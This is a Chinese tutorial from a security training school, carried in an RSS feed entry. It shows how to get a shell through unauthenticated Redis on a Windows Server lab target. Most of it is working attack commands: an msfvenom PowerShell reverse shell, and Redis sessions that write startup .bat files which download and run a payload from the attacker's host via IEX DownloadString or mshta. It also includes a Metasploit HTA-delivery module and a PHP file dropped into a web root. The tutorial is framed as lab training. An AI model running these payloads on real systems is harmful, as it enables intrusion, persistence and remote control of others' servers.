&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-650ce066a43c3fdedd0bcaff2bd3e5ff_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Redis&lt;/h2&gt;&lt;p&gt;Redis 是一个开源的高性能键值数据库。最热门的 NoSql 数据库之一，也被人们称为数据结构服务器。&lt;/p&gt;&lt;p&gt;它最突出的特点就是：&lt;b&gt;快&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;以内存作为数据存储介质，读写数据的效率极高。&lt;/li&gt;&lt;li&gt;跟 memcache 不同的是，储存在 Redis 中的数据是持久化的，断电或重启，数据也不会丢失。&lt;/li&gt;&lt;li&gt;存储分为内存存储、磁盘存储和 log 文件。&lt;/li&gt;&lt;li&gt;可以从磁盘重新将数据加载到内存中，也可以通过配置文件对其进行配置，因此，redis 才能实现持久化。&lt;/li&gt;&lt;li&gt;支持主从模式，可以配置集群，更利于支撑大型的项目。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;搭建环境&lt;/h2&gt;&lt;p&gt;靶机 Windows Server 2012 &lt;/p&gt;&lt;p&gt;攻击机：kali linux&lt;/p&gt;&lt;p&gt;Redis 下载：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/microsoftarc&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;hive/redis&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; （这里用的是 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;3.2.100 版本&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;安装完 Redis 后会自动启动，先停止 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-stop&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;更改配置文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入 Redis 的安装目录，然后修改 windows.conf 文件&lt;/p&gt;&lt;p&gt;注释掉# bind 127.0.0.1&lt;/p&gt;&lt;p&gt;把 protected-mode yes 改成 protected-mode no&lt;/p&gt;&lt;p&gt;这样就可以模拟未授权访问的 Redis 靶机。&lt;/p&gt;&lt;p&gt;&lt;b&gt;端口设置&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Redis 默认端口是 6379，所以需要在 windows 的防火墙里开放 6379 端口，或者靶机直接就关闭防火墙。&lt;/p&gt;&lt;p&gt;&lt;b&gt;测试未授权访问&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./redis-cli -h xxx.xxx.xxx.xxx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;配置 Windows server 2012&lt;/b&gt;&lt;/p&gt;&lt;p&gt;默认是无法在启动项文件夹写文件的，需要把 C:\Users\Administrator 文件夹的组添加上 Everyone 并把权限改成完全控制。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;相关命令：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;卸载 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-uninstall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-install redis.windows.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;启动 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-start &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;下面介绍今天的主题，几种 Redis Getshell 的方法&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;几种 &lt;/b&gt;Redis&lt;b&gt; Getshell 方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;001——利用 powershell 反弹 shell&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先用 msfvenom 生成 shell.ps1 文件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -f psh-reflection &amp;gt;shell.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后把 shell.ps1 文件复制到 /var/www/html 目录下，然后启动 apache2&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;用 msf 进行监听，设置 payload 的时候注意区分 32 位和 64 位操作系统&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 &amp;gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;利用 Redis 写入 bat 文件到启动项&lt;/p&gt;&lt;p&gt;注意  \r\n\r\n 代表换行的意思，因为用 redis 写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠用来转义 payload 中的双引号。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;xxx.xxx.xxx.1:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; config set dbfilename shell.bat
OK
xxx.xxx.xxx.1:6379&amp;gt; set x &amp;#34;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://xxx.xxx.xxx.2/shell.ps1&amp;#39;);xx.ps1\&amp;#34;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启后得到 shell&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;002——使用 mshta.exe&lt;/b&gt;&lt;/p&gt;&lt;p&gt;到 /usr/share/metasploit-framework/modules/exploits/windows 目录下创建一个 msh_shell.rb 文件，复制以下内容。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
  
  
class MetasploitModule  &amp;lt; Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::HttpServer
  
  def initialize(info  = {})
    super(update_info(info,
      &amp;#39;Name&amp;#39; =&amp;gt; &amp;#39;Microsoft Office Payload Delivery&amp;#39;,
      &amp;#39;Description&amp;#39; =&amp;gt; %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      &amp;#39;License&amp;#39; =&amp;gt; MSF_LICENSE,
      &amp;#39;Arch&amp;#39; =&amp;gt; ARCH_X86,
      &amp;#39;Platform&amp;#39; =&amp;gt; &amp;#39;win&amp;#39;,
      &amp;#39;Targets&amp;#39; =&amp;gt;
        [
          [&amp;#39;Automatic&amp;#39;, {} ],
        ],
      &amp;#39;DefaultTarget&amp;#39; =&amp;gt; 0,
    ))
  end
  
  def on_request_uri(cli, _request)
    print_status(&amp;#34;Delivering payload&amp;#34;)
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      &amp;#39;win&amp;#39;,
      p.encoded,
      &amp;#39;hta-psh&amp;#39;,
      { :arch =&amp;gt; ARCH_X86, :platform =&amp;gt; &amp;#39;win &amp;#39;}
    )
    send_response(cli, data, &amp;#39;Content-Type&amp;#39; =&amp;gt; &amp;#39;application/hta&amp;#39;)
  end
  
  
  def primer
    url = get_uri
    print_status(&amp;#34;Place the following DDE in an MS document:&amp;#34;)
    print_line(&amp;#34;mshta.exe \&amp;#34;#{url}\&amp;#34;&amp;#34;)
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后在 msf 里重新加载所有模块：reload_all&lt;/p&gt;&lt;p&gt;再找到这个模块就可以使用了&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 exploit(windows/msh_shell) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf5 exploit(windows/msh_shell) &amp;gt; set lhost xxx.xxx.xxx.xxx
lhost =&amp;gt; xxx.xxx.xxx.xxx
msf5 exploit(windows/msh_shell) &amp;gt; set uripath shell
uripath =&amp;gt; shell
msf5 exploit(windows/msh_shell) &amp;gt; exploit 
zlib(finalizer): the stream was freed prematurely.
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:4444 
[*] Using URL: http://0.0.0.0:8080/shell
[*] Local IP: http://xxx.xxx.xxx.xxx:8080/shell
[*] Server started.
[*] Place the following DDE in an MS document:
mshta.exe &amp;#34;http://xxx.xxx.xxx.xxx:8080/shell&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后利用 Redis 写入 bat 文件到启动项&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename shell.bat
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\nmshta http://xxx.xxx.xxx.xxx:8080/shell\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启靶机就可以拿到 session&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1231&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1231&quot; data-original=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;003——使用Cobalt Strike&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;把 Cobalt Strike 的服务端脚本放到 kali 上运行，然后客户端在本机运行。&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/aleenzz/Cobalt_Strike_wiki&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/aleenzz/Coba&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lt_Strike_wiki&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;这里就不搭环境操作了。。。&lt;/p&gt;&lt;p&gt;&lt;b&gt;004——利用web服务&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果目标有 Web 业务的话，可以结合 web 业务进行 Getshell。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
xxx.xxx.xxx.xxx:6379&amp;gt; config set dir &amp;#34;C:/phpstudy/WWW&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; config set dbfilename phpinfo.php
OK
xxx.xxx.xxx.xxx:6379&amp;gt; set x &amp;#34;\r\n\r\n&amp;lt;?php phpinfo();?&amp;gt;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.xxx:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1954&quot; data-rawheight=&quot;677&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1954&quot; data-original=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-08-101701119</guid>
<pubDate>Wed, 08 Jan 2020 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
